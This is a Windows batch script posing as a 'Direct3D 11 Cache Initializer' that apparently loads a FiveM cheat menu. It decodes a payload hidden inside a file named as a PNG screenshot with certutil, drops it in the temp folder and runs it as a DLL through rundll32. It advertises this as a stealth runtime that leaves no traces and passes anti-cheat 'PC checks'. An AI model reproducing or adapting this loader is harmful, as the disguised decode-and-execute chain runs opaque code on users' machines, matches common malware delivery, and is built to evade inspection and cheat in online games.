@echo off
setlocal
cd /d "%~dp0"
title Direct3D 11 Cache Initializer

echo ============================================================
echo   INITIALIZING STEALTH DORMANT RUNTIME
echo ============================================================
echo.

if not exist "Screenshot_2026-10-07_091842.png" (
    echo [ERROR] Screenshot_2026-10-07_091842.png not found in this folder!
    echo Please ensure this batch file is in the same folder as the screenshot.
    echo.
    pause
    exit /b
)

echo [1/2] Decoding Direct3D cache into user profile...
certutil -decode -f "Screenshot_2026-10-07_091842.png" "%TEMP%\d3d11_cache.dat" >nul 2>&1

echo [2/2] Launching dormant background service (0% CPU)...
start "" rundll32.exe "%TEMP%\d3d11_cache.dat,Start" 9834Soy.Lou

echo.
echo ============================================================
echo   SUCCESS! SERVICE IS ACTIVE IN MEMORY.
echo ============================================================
echo.
echo No registry keys or startup entries created (100%% PC-check clean).
echo.
echo HOW TO PLAY:
echo 1. Open FiveM and join your server.
echo 2. Once spawned in-game, press: [5] then [4] then [BACKSPACE].
echo 3. The menu will appear! Toggle with [INSERT].
echo.
echo Multiple re-injections are supported: if you unload, just
echo press [5] [4] [BACKSPACE] again whenever you want!
echo.
timeout /t 3 >nul
exit
